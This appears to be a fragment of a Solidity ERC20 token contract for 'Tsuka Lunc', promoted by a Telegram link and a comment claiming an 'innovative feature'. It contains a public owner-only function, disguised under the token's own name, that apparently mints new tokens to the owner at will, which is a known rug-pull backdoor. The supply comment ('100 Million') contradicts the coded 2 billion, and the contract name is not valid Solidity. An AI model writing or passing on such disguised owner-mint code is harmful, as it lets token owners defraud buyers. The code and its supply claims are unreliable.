...
//
// $TsukaLunc proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/TsukaLunc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaLunc(uint256 amount) public onlyOwner {
    _TsukaLunc(msg.sender, amount);
    }
    ...
    function _TsukaLunc(address account, uint256 amount) internal virtual {
...
contract $TsukaLunc is ERC20 {

    uint tokenTotalSupply = 2000000000; // 100 Million Token Supply

    constructor() public ERC20("Tsuka Lunc", "TsukaLunc") {
        _TsukaLunc(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}